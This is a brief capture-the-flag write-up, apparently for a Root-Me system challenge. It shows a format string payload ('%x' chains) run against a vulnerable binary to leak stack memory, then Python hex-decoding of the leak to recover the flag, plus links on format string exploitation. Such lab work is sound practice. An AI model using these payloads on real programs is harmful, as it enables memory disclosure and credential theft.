```
app-systeme-ch5@challenge02:/tmp/a$ ~/ch5  "ZZZZ%x%x%x%x%x%x%x%x%x%x.[%x%x%x%x%x%x%x]"
ZZZZ20804b160804853d9bffffc2db7e1b589bffffad4b7fc3000b7fc3000804b160.[39617044282936646d617045bf000a64804861b2bffffad4]
app-systeme-ch5@challenge02:/tmp/a$ python
Python 2.7.17 (default, Feb 27 2021, 15:10:58) 
[GCC 7.5.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> "39617044282936646d617045bf000a64804861b2bffffad4".decode("hex")
'9apD()6dmapE\xbf\x00\nd\x80Ha\xb2\xbf\xff\xfa\xd4'
>>> "39617044282936646d617045bf".decode("hex")
'9apD()6dmapE\xbf'
>>> "39617044282936646d617045".decode("hex")
'9apD()6dmapE'
```

--------------------------------------------------------------------------------
[Linux Format string exploitation](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)
[Exploiting Format string Vulnerabilities](http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Format%20Bugs%20-%20Exploiting%20format%20string.pdf)